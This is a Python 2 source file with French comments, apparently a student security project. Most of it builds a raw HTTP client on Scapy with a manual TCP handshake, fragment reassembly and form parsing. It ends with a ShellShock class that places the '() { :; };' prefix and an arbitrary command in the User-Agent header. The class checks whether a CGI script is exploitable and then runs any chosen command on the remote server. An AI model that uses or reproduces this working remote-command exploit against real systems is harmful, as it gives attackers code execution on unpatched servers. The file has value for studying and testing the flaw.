#! /usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
import hashlib
import Queue
import time
import re
import os

def getUniqueID():
    return hashlib.md5(str(time.time())).hexdigest()

class HTTP(object):
    """
    Cette classe permet de manipuler les requêtes HTTP via SCAPY. La méthode GET est implémenté.
    Les fonctions getForms et getRessources permettent de récupérer respectivement les formulaires
    (paramètre et inputs) ainsi que les ressources incluent dans la page (html et php seulement).

    Reste à implémenter: méthode POST
    """
    # Defining rgex to parse content
    RES_REGEX = re.compile(r"src\=(?:\"|')(?P<location>.*?)\.(?P<ext>\w+?)(?P<param>\?.*?)?(?:\"|')", re.IGNORECASE)
    FORM_REGEX = re.compile(r"<form(?P<form_param>.*?)>(?P<content>.*?)</form>", re.IGNORECASE | re.DOTALL)
    INPUT_REGEX = re.compile(r"<input(.*?)>", re.IGNORECASE | re.DOTALL)
    TXTAREA_REGEX = re.compile(r"<textarea(.*?)>(?:.*?)</textarea>", re.IGNORECASE | re.DOTALL)
    SELECT_REGEX = re.compile(r"<select(.*?)>(?:.*?)<option(?:.*?)value=(?:\"|')(.*?)(?:\"|')(?:.*?)>(?:.*?)</option>(?:.*?)</select>", re.IGNORECASE)
    PARAM_REGEX = re.compile(r"(?P<name>\w*?)\=(?:\"|')(?P<value>.*?)(?:\"|')", re.IGNORECASE)

    # Defining TCP flags
    FIN = 0x01
    SYN = 0x02
    RST = 0x04
    PSH = 0x08
    ACK = 0x10

    # Defining error codes
    HOST_DOWN_ERROR = -1
    CON_RST_ERROR = -2

    def __init__(self, host, sport = None, header = {}):
        self.host = host
        if not sport: self.sport = random.randint(30000, 65000)
        else: self.sport = sport

        self.request_header = {"User-Agent":"sr2i203/0.1.1+debian-1",
        "Accept":"text/html, text/*;q=0.5, image/*, application/*, video/*, audio/*, message/*, inode/*, x-content/*, misc/*, x-scheme-handler/*",
        "Host":host}

        # On ajoute les headers donnés en paramètre
        for k in header: self.setHeader(k, header[k])

        self.get = {}

    def setHeader(self, name, value):
        self.request_header[name] = value

    def handshake(self):
        """
            Permet d'établir le handshake TCP entre la machine et un hôte distant
        """

        # print "SYN/ACK ", self.host, self.sport
        syn = IP(dst = self.host) / TCP(dport=80, sport=self.sport, flags='S')
        syn_ack = sr1(syn, verbose=0) # Sending syn, receiving syn ack

        if syn_ack.haslayer(TCP):
            ack = IP(dst = self.host) / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A')
            send(ack, verbose = 0) # Sending ack
            return syn_ack
        else:
            return None

    def close(self, con, init = False):
        """
            Ferme la connexion passée en paramètre. Si init est à True, cela signifit que c'est la machine locale qui initie la fermeture de connexion.
        """

        if con.haslayer(Raw):
            close = IP(dst=con[IP].src) / TCP(dport=80, sport=con[TCP].dport, seq=con[TCP].ack, ack=con[TCP].seq + len(con[Raw].load), flags='FA')
        else:
            close = IP(dst=con[IP].src) / TCP(dport=80, sport=con[TCP].dport, seq=con[TCP].ack, ack=con[TCP].seq + 1, flags='FA')

        # If connection closing initiated by client: send(FIN ACK) -> rcv(ACK then FIN ACK) -> send(ACK)
        # If connection closing initiated by server:                          send(FIN ACK) ->  rcv(ACK)
        if init:
            a, u = sr(close, verbose = 0, multi=1, timeout=0.5) # send(FIN ACK) -> rcv(ACK then FIN ACK)
            r = a[-1][1]                                        # Selectinf FIN ACK in received packets
            send(IP(dst=r[IP].src) / TCP(dport=80, sport=r[TCP].dport, seq=r[TCP].ack, ack=r[TCP].seq + 1, flags='A'), verbose=0) # Sending final ACK
        else: send(close, verbose=0) # Sending FIN ACK

    def addFragment(self, html_rep, page, ack, seq):
        """
            Ajoute un fragment TCP recu à la liste des fragments TCP
            Parse le header de la réponse HTTP s'il s'agit du premier fragment
        """

        if page in self.get and not html_rep.startswith('HTTP'):
            if not (ack, seq) in self.get[page]['data_frag']:
                self.get[page]['data_frag'][(ack, seq)] = html_rep      # Adding a fragment
                self.get[page]['len'] += len(html_rep)                  # Updating total data length

        elif html_rep.startswith('HTTP'):   # Received fragment is the first one (HTTP header)
            try: header, data = html_rep.split('\r\n\r\n', 1)
            except: # if no data in fragment header, split raise an error
                header = html_rep
                data = ''
            header = header.split('\r\n')   # Splitting header lines
            code = int(header[0].split(' ')[1])

            # Modifying header special fields that have no value so no ": " (to avoid errors later)
            for i in range(len(header)):
                 if ': ' not in header[i]: header[i] += ': '

            header = {i.split(': ')[0].title():i.split(': ')[1] for i in header[1:]}
            self.get[page] = {'code':code, 'header':header, 'data_frag':{(ack, seq):data}, 'data':data, 'len': len(data)}
        else:
            print "ERREUR A TRAITER: HEADER N EST PAS ARRIVE EN PREMIER..."

    def mergeFragments(self, page):
        """
            Cette fonction fusionne les fragments TCP collectés dans le bon ordre
        """
        if page in self.get:
            self.get[page]['data'] = ''.join([self.get[page]['data_frag'][i] for i in sorted(self.get[page]['data_frag'].keys())])

    def request(self, req_funct, page = '', con=None, data =None):

        # Handshake
        if con == None:
            syn_ack = self.handshake()
            if not syn_ack:
                print "Host down"
                return HTTP.HOST_DOWN_ERROR
        else : syn_ack = con

        # GET OR POST
        con = req_funct(page, syn_ack, data)

        if con[TCP].flags & HTTP.RST: return HTTP.CON_RST_ERROR # If connection reseted => exit function

        # Close connection
        del(self.get[page]['data_frag']) # Useless after this point, so deleting
        if 'Location' in self.get[page]['header']: #self.get[page]['code'] == 301: # 301: Moved permanently => calling GET recursively
            return self.request(req_funct, self.get[page]['header']['Location'], con, data)
        self.close(con, True)

        return self.get[page]

    def POST(self, page = '', con=None, data={}):
        return self.request(self.__http_post, page, con, data)

    def GET(self, page = '', con=None):
        return self.request(self.__http_get, page, con)

    def getForms(self, page):
        """
        Recherche les formulaires inclus dans une page
        """

        forms = HTTP.FORM_REGEX.findall(self.get[page]['data'])
        self.get[page]['forms'] = []
        for params, content in forms:
            form = {}

            form = dict(HTTP.PARAM_REGEX.findall(params))

            # Parsing regular inputs
            inputs = HTTP.INPUT_REGEX.findall(content)
            form['inputs'] = {}
            for e in inputs:
                params = dict(HTTP.PARAM_REGEX.findall(e))

                try: name = params['name']
                except: name = params['type']

                form['inputs'][name] = params
                if 'required' in params: form['inputs'][name]['required'] = True

            # Parsing text areas
            txtareas = HTTP.TXTAREA_REGEX.findall(content)
            for txtarea in txtareas:
                params = dict(HTTP.PARAM_REGEX.findall(txtarea))

                form['inputs'][params['name']] = params
                form['inputs'][params['name']]['type'] = 'textarea'
                if 'required' in params: form['inputs'][params['name']]['required'] = True

            # Parsing select inputs
            selects = HTTP.SELECT_REGEX.findall(content)
            for params, value in selects:
                params = dict(HTTP.PARAM_REGEX.findall(params))

                form['inputs'][params['name']] = params
                form['inputs'][params['name']]['type'] = 'select'
                form['inputs'][params['name']]['value'] = value
                if 'required' in params: form['inputs'][params['name']]['required'] = True


            self.get[page]['forms'].append(form)
        return self.get[page]['forms']

    def getRessources(self, page):
        """
        Recherche les ressources web (html, PHP) inclues dans une page
        """

        res = HTTP.RES_REGEX.findall(self.get[page]['data'])
        to_fetch = []

        # Regex give location, extension and parameters of each field
        for loc,ext,param in res:
            if ext in ['html', 'htm', 'php']:
                if loc.startswith('../'):
                    # Fetch res with relative path
                    loc = os.path.normpath(os.path.join(os.path.dirname(page), loc))
                    to_fetch.append(loc)
                elif loc.startswith('/'):
                    # Fetch res with absolute path
                    to_fetch.append(loc[1:])
                else: continue  # External res not fetched
        return to_fetch


    def formatHeader(self):
        """
        Formate le dictionnaire du header pour l'insérer en texte dans la requête HTTP
        """
        return ''.join([i + ": " + self.request_header[i] + '\r\n' for i in self.request_header]) + '\r\n'

    def __http_get(self, page, syn_ack, data=None):
        """
        Execute une requête GET et renvoie le résultat
        """

        # Envoie de la requête GET
        getStr = 'GET /' + page + ' HTTP/1.1\r\n' + self.formatHeader()

        return self.__tcp_request(page, syn_ack, getStr)


    def __http_post(self, page, syn_ack, data=''):
        # Modifying header to send form
        self.setHeader('Content-Type', 'application/x-www-form-urlencoded')
        self.setHeader('Content-Length', str(len(data)))

        # Sending POST request
        postStr = 'POST /' + page + ' HTTP/1.1\r\n' + self.formatHeader()
        postStr += data

        # Deleting POST-specific headers
        del self.request_header['Content-Type']
        del self.request_header['Content-Length']

        return self.__tcp_request(page, syn_ack, postStr)


    def __tcp_request(self, page, syn_ack, http_request):
        """
            Execute une requete TCP en y ajoutant une requête HTML donnée en paramètre
        """
        # Creating FIFO queue
        q = Queue.Queue()

        # Preparing packet with the http payload
        request = IP(dst=self.host) / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='PA') / http_request
        repl, u = sr(request, multi=1, timeout=1, retry=3, verbose=0)

        # Append all received packets to a FIFO queue
        for s, reply in repl: q.put(reply)

        # Proceeding queue and adding new replies to it
        while not q.empty():
            reply = q.get()

            # If the fragment contains data (and is a ACK or PUSH ACK)
            if reply[TCP].flags & HTTP.ACK and (reply.haslayer(Raw)):

                # We add the fragment to previously fetched fragments for this page
                self.addFragment(reply[Raw].load, page, reply[TCP].ack, reply[TCP].seq)

                # Preparing the ACK for the receivedd fragment
                request = IP(dst=self.host) / TCP(dport=80, sport=reply[TCP].dport, seq=reply[TCP].ack, ack=reply[TCP].seq + len(reply[Raw].load), flags='A')

                # Veryfing if request completed
                if 'Content-Length' in self.get[page]['header'] and self.get[page]['header']['Content-Length'] <= self.get[page]['len']: break

                # Sending ACK and waiting for new fragments
                a, u = sr(request, verbose = 0, timeout=0.1, multi=1)
                for s, r in a: q.put(r) # Adding new fragments to queue

            elif reply[TCP].flags & HTTP.RST : break # If receiving RST flag -> no more data will be sent

        # Merging fragments
        self.mergeFragments(page)
        return reply


class ShellShock(HTTP):
    """
        Cette classe permet de tester et d'exploiter la faille ShellShock. Cette
        classe hérite de HTTP car cette attaque peut se résumer à une requête avec
        un user agent particulier.
        Cette faille n'est exploitable que via un script CGI.
    """

    USER_AGENT = "() { :; };"#ping -c 15 -p 5348454c4c5f53484f434b5f574f524b -s 32 "}

    def __init__(self, host, script_page, header = {}):
        super(ShellShock, self).__init__(host, header = header)
        self.target = script_page

    def test(self):
        uid = getUniqueID()
        pattern = "SHELL_SHOCK_WORK_HERE_" + uid
        self.run("echo; echo '" + pattern + "'")

        if pattern in self.get[self.target]['data']:
            print "Faille ShellShock exploitable sur " + self.host
            return True
        else:
            print "Faille ShellShock non exploitable sur " + self.host
            return False

    def run(self, command):
        self.setHeader('User-Agent', ShellShock.USER_AGENT + command)
        print ShellShock.USER_AGENT + command
        self.GET(self.target)
